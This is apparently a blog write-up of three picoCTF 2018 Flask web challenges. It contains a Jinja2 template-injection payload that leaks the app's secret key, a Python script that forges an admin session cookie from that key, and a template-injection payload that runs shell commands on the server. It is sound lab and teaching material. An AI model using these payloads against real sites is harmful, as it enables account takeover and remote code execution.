---
layout: post
title: picoCTF'18 - Flaskcards writeup
date: 2018-10-12
---

___
## Summary / TL;DR

I played in picoCTF again this year, and I think I performed a lot better than I did last year, especially in web, I wanted to share this writeup because I think I did a good job being the **<u>75th</u>** person (out of like 5000 other players) to solve the final part of this series of web challenges.

1. **Flaskcards** (350 pts)
2. **Flaskcards Skeleton Key** (600 pts)
3. **Flaskcards and Freedom** \[Highest point web challenge] (900 points)  

___
  

# Flaskcards

## Description / Hints / URL

We found [this](http://2018shell1.picoctf.com:51878/){:target="_blank"} fishy website for flashcards that we think may be sending secrets. Could you take a look? 

```
- Are there any common vulnerabilities with the backend of the website?
- Is there anywhere that filtering doesn't get applied?
- The database gets reverted every 2 hours so your session might end unexpectedly. Just make another user
```

## Thought Process

Based on CTF playing experience, the challenge and flavourtext always gives hints about the vulnerability or at least a starting point. In this case `Flask` is a dead giveaway that it has something to do with the Flask webserver.

After registering and logging in, we are shown a navbar that gives us a bit more hinting. 
![navbar](https://vgy.me/YUkEMJ.png)

**Ccreate Cards** -- Allows users to enter input and save it  
**List Cards** -- Shows the saved input that was entered beforehand  
**Admin** -- Not important for this challenge, used in further challenge 

As an example:  
![list-create](https://vgy.me/HlN6i5.png)

Some experienced CTF players may know straight away what to do at this point, if not then well this is a sign of user input being reflected, which could be a few things, notably _Cross Site Scripting_ (XSS) or _Server-Side Template Injection_ (SSTI)

## Exploitation

First thing I tried was XSS because why not ?  
![xss-attempt](https://vgy.me/85lTVv.png)
Unfortunately the payloads were being escaped so by rule of elimination the other thing left to try was **SSTI** ! 

Not going to go into how **SSTI** works but essentially your input gets evaluated and the result is returned, not good for keeping secrets ... 

Here is an example probing payload:  
![4times4](https://vgy.me/2lWc1L.png)
 
## Flag 
{% raw %}
The flag is most likely stored in the `SECRET_KEY` variable maintained internally by Flask, so we can use `{{ config }}` to dump out all the variables:  
![configz](https://vgy.me/bLucDr.png)
{% endraw %}

<div class="divider"></div>
# Flaskcards Skeleton Keys

## Description / Hints / URL
Nice! You found out they were sending the Secret_key: a155eb4e1743baef085ff6ecfed943f2. Now, can you find a way to log in as admin? http://2018shell1.picoctf.com:53588 .

```
- What can you do with a flask Secret_Key?
- The database still reverts every 2 hours
```
## Thought Process
This one took me awhile because I wasn't sure what I was doing wrong, but actually the answer is very staright forward ! The key is given to us: `a155eb4e1743baef085ff6ecfed943f2`.

We first grab the existing _non-admin_ session cookie off the site which is something like this:
```
.eJwlj0FqBDEMBP_i8x5kWZKl_cxiWRIJgQRmdk8hf8-EXPpQUFD93R515PnW7s_jlbf2eI92b7lpOq4eXfRvd-7IBCumiY7AfZqEuoGn8dC9zcVrsefM6nP0cCcX6oUhwaZwsQEohmYlqbvzSMWpnQxh0NDFQLpIAGy1W9vnUY_n10d-Xj2Kw124XC1SKbUWGImHYueShUzqscblvc48_k90aD-_1SE-cQ.DqESzA.6Di3_tN-krfQX-10KZLnH9ncisw
```
It goes without saying that when we visit the `/admin` page we don't get the flag, at least not yet ... 

 We know that secrets are usually used to sign cookies and a quick search on the interwebz gives us a nice and easy [program](https://gist.github.com/babldev/502364a3f7c9bafaa6db) to decrypt and encrypt our own cookies using the key :)

## Exploitation 
After some slight modification and experimenting the (cleaned-up) version of the script I used was:
```python 
#!/usr/bin/python

import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
salt = 'cookie-session'
serializer = TaggedJSONSerializer()

secret_key = "a155eb4e1743baef085ff6ecfed943f2"
cookie_str = ".eJwlj0FqBDEMBP_i8x5kWZKl_cxiWRIJgQRmdk8hf8-EXPpQUFD93R515PnW7s_jlbf2eI92b7lpOq4eXfRvd-7IBCumiY7AfZqEuoGn8dC9zcVrsefM6nP0cCcX6oUhwaZwsQEohmYlqbvzSMWpnQxh0NDFQLpIAGy1W9vnUY_n10d-Xj2Kw124XC1SKbUWGImHYueShUzqscblvc48_k90aD-_1SE-cQ.DqESzA.6Di3_tN-krfQX-10KZLnH9ncisw"

signer_kwargs = {
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1
}

s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)

print "=== User u ==="
print s.loads(cookie_str)
print ''

manipulate = s.loads(cookie_str)
manipulate['user_id'] = '1'.decode('utf-8')

print "=== MANIPULATED ==="
print manipulate
print ''
print s.dumps(manipulate)
print "======================="
```

The decrypted cookie had a user_id value which would determine whose session you logged in as, I kept failing because I was going after user_id **0** which is usually the admin, but I guess sometimes 1 is worth a try as well  

The manipulated cookie was:
```
.eJwlj0FqBDEMBP_i8x4kWZKl_cxiWTIJgQRmdk8hf8-EXPpQUFD93R77qPOt3Z_Hq27t8Z7t3mrxCJqYqPa3q1ZWgW_hQUEgOFzTwiHKpdtaHhp7StSojaNjRnAo46bUFDe4WAdSJ_etZQull9EwZCfo3G0KsE1WAJ_t1tZ57Mfz66M-rx6jHqGywzzLuGxPcNZII5Stk4QtcvbLe511_J_A9vMLlu8-QQ.DqETSg.MoGOf2Esi4EScYNpa8Y_hOikdbQ
```

By copying this value into the clipboard and repasting into a cookie editor, we can now visit the `/admin` page to get the flag ~ 

Note:  The cookie should **NOT** have a trailing newline, as this causes the cookie to not be parsed properly !     

## Flag 
![flag2](https://vgy.me/hX4nrZ.png)

<div class="divider"></div>
# Flaskcards and Freedom

## Description / Hints / URL
There seem to be a few more files stored on the flash card server but we can't login. Can you? http://2018shell1.picoctf.com:52168

```
- There's more to the original vulnerability than meets the eye.
- Can you leverage the injection technique to get remote code execution?
- Sorry, but the database still reverts every 2 hours.
```

## Thought Process
Again, the title gives us a hint of what to do ... __Freedom__ relates to sandbox escaping, or in this case we just need to get _Remote Code Execution_ (RCE) somehow, in the 2nd challenge the templating bug was patched but is reintroduced again in this challenge. Therefore we know that this is a chance to do more **SSTI** stuff ! 


I'm really glad I took extended WebApps because I learnt how to do exactly this type of challenge, to learn how I constructed the payload, these two pages [(1)](https://0day.work/bsidessf-ctf-2017-web-writeups/#zumbo3){:target="_blank"} [(2)](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html){:target="_blank"} may help out ...

## Exploitation

After much experimentation and failure, the final crafted payload I managed to get working was this:
{% raw %}
```python
{{[].__class__.__base__.__subclasses__()[111].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat flag").read()') }}
```
{% endraw %}

## Flag 
After submitting this to **Create Card** our commands would be reflected back to us, it was as simple as doing `ls` followed by `cat flag` to obtain the flag !   
![image](https://vgy.me/LLFMGS.png)

